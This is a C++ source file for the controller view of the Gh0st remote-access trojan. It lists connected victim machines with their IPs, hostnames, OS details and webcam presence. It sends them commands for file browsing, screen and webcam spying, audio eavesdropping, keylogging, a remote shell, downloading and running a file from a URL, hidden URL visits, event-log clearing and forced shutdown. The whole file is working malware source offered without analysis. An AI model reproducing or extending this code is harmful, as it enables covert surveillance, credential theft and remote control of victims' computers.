// gh0stView.cpp : implementation of the CGh0stView class
//

#include "stdafx.h"
#include "gh0st.h"

#include "gh0stDoc.h"
#include "gh0stView.h"
#include "MainFrm.h"

#include "BuildView.h"
#include "SettingsView.h"

#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "InputDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CGh0stView* g_pConnectView;
extern CMainFrame* g_pFrame;
#define WM_MYINITIALUPDATE (WM_USER + 101)



typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] = 
{
	{"ID",				48	},
	{"WAN",				102	},
	{"LAN",				102	},
	{"计算机名/备注",	107	},
	{"操作系统",		128	},
	{"CPU",				55	},
	{"Ping",			40	},
	{"摄像头",			51	},
	{"区域",			100	}
};

int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8) - !((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist;


/////////////////////////////////////////////////////////////////////////////
// CGh0stView

IMPLEMENT_DYNCREATE(CGh0stView, CListView)

BEGIN_MESSAGE_MAP(CGh0stView, CListView)
	//{{AFX_MSG_MAP(CGh0stView)
	ON_WM_SIZE()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_CLEANEVENT, OnCleanevent)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_MYINITIALUPDATE, OnMyInitialUpdate)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stView construction/destruction

CGh0stView::CGh0stView()
{
	// TODO: add construction code here
	m_nCount = 0;

	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}


	((CGh0stApp *)AfxGetApp())->m_pConnectView = this;
	m_pListCtrl = NULL;
}

CGh0stView::~CGh0stView()
{
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView drawing

void CGh0stView::OnDraw(CDC* pDC)
{
	CGh0stDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

void CGh0stView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();

	//////////////////////////////////////////////////////////////////////////
	NONCLIENTMETRICS ncm;
	memset(&ncm, 0, sizeof(NONCLIENTMETRICS));
	ncm.cbSize = sizeof(NONCLIENTMETRICS);
	
	VERIFY(::SystemParametersInfo(SPI_GETNONCLIENTMETRICS,
		sizeof(NONCLIENTMETRICS), &ncm, 0));
	ncm.lfMessageFont.lfWeight = 500;
	m_headerCtrl.m_HeaderFont.CreateFontIndirect(&ncm.lfMessageFont);
	SetFont(&(m_headerCtrl.m_HeaderFont));
	//////////////////////////////////////////////////////////////////////////

	m_pListCtrl = &GetListCtrl();
	
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_pListCtrl->m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);

	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}

	// 设置数据段
	SetColumnNumeric(0);
	SetColumnNumeric(6);
	PostMessage(WM_MYINITIALUPDATE);
	// TODO: You may populate your ListView with items by directly accessing
	//  its list control through a call to GetListCtrl().
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView diagnostics

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CListView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif
/////////////////////////////////////////////////////////////////////////////
// CGh0stView message handlers

LRESULT CGh0stView::OnMyInitialUpdate(WPARAM, LPARAM)
{
	CGh0stView* pView = this;

	// Add Connects Window
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Connections", this, "Connections Users");


	// Add Settings Window
	CSettingsView* pSettingsView = new CSettingsView;
	((CWnd*)pSettingsView)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,
		CRect(0,0,0,0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);

	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Settings", pSettingsView, "Control Settings");
	

	// Add Build Window
	//对于CFormView派生类必须新生成对象而不能使用成员对象
	CBuildView *pBuildView = new CBuildView;
	//由于CFormView的成员受保护，所以必须对指针进行强制转换
	((CWnd*)pBuildView)->Create(NULL,NULL, WS_CHILD|WS_VISIBLE,CRect(0,210,400,400), pBuildView->GetActiveWindow(), 111 ,NULL);
	
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Build", pBuildView, "Build Server");

 	((CMainFrame*)AfxGetApp()->m_pMainWnd)->SetCurView(0);
	return 0;
}


LRESULT CGh0stView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{
	
	ClientContext *pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

LRESULT CGh0stView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{


	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CGh0stView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CGh0stView::OnSize(UINT nType, int cx, int cy) 
{
	CListView::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	// OnSize 的时候m_pListCtrl还没有初始化
	if (m_pListCtrl == NULL)
		return;

 	CRect rcClient;
 	GetClientRect(rcClient);

	int	nClientWidth = rcClient.Width();
	int nIndex = g_Column_Count - 1;
	
	if (nClientWidth < g_Column_Width)
		return;
	
	m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);	
}

void CGh0stView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CListView::OnRButtonDown(nFlags, point);

	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_pListCtrl->GetSelectedCount() == 0)
	{
		for (int i = 0; i < count - 2; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);

	}
	
	// 全选
	if (m_pListCtrl->GetItemCount() > 0)
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_ENABLED);
	else
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
}

LRESULT CGh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText, strOS;
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		
		// ID
		CString	str;
		str.Format("%d", m_nCount++);	
		
		// IP地址
		int i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		m_pListCtrl->SetItemText(i, 1, IPAddress);

		// 内网IP
		m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));

		// 主机名
		m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);

		// 系统

		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
			
		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
				pszOS = "NT";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "2000";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
				pszOS = "XP";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
				pszOS = "2003";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "Vista";  // Just Joking
		}
		strOS.Format
			(
			"%s SP%d (Build %d)",
			//OsVerInfo.szCSDVersion,
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		m_pListCtrl->SetItemText(i, 4, strOS);

		// CPU
		str.Format("%dMHz", LoginInfo->CPUClockMhz);
		m_pListCtrl->SetItemText(i, 5, str);

		// Speed
 		str.Format("%d", LoginInfo->dwSpeed);
 		m_pListCtrl->SetItemText(i, 6, str);


		str = LoginInfo->bIsWebCam ? "有" : "--";
		m_pListCtrl->SetItemText(i, 7, str);

		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);

		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		{

			str = m_QQwry->IPtoAdd(IPAddress);
			m_pListCtrl->SetItemText(i, 8, str);

			strToolTipsText += "\nArea: ";
			strToolTipsText += str;
		}
		// 指定唯一标识
		m_pListCtrl->SetItemData(i, (DWORD) pContext);

		g_pFrame->ShowConnectionsNumber();
	
		if (!((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);
	}catch(...){}

	return 0;
}
	
LRESULT CGh0stView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	// 删除链表过程中可能会删除Context
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
			{
				m_pListCtrl->DeleteItem(i);
				break;
			}		
		}

		// 关闭相关窗口

		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
		case SCREENSPY_DLG:
		case WEBCAM_DLG:
		case AUDIO_DLG:
		case KEYBOARD_DLG:
		case SYSTEM_DLG:
		case SHELL_DLG:
			//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
			break;
		default:
			break;
		}
	}catch(...){}

	// 更新当前连接总数
	g_pFrame->ShowConnectionsNumber();
	return 0;
}


void CGh0stView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	// TODO: Add your command handler code here
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, pData, nSize);

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}

void CGh0stView::OnFilemanager()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnScreenspy() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnWebcam() 
{
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGh0stView::OnAudioListen() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CGh0stView::OnDownexec() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


void CGh0stView::OnRemove() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认卸载服务端吗 -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CGh0stView::OnKeyboard() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnSystem() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CGh0stView::OnRemoteshell() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CGh0stView::OnLogoff() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void CGh0stView::OnReboot() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CGh0stView::OnShutdown() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CGh0stView::OnSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);   
	}
}

void CGh0stView::OnUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
	}	
}

void CGh0stView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CGh0stView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CGh0stView::OnCleanevent()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CGh0stView::OnRenameRemark() 
{
	// TODO: Add your command handler code here

	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format("更改主机(%s)的备注", m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle = "批量更改主机备注";
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 3, dlg.m_str);
	}

	delete[] lpPacket;		
}

void CGh0stView::OnUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("下载更新服务端"), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CGh0stView::OnDisconnect() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while (pos) 
	{
		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));	
	}
}
